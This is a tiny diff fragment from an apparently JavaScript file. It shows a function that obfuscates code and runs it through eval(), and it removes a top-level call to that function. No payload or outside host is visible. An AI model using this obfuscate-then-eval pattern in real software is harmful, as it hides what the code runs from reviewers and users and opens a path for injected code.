@@ -53,5 +53,3 @@ function obfuscateAndExecute(code) {
     }).getObfuscatedCode();
     eval(obfuscatedCode);
   }
-
-obfuscateAndExecute(code);
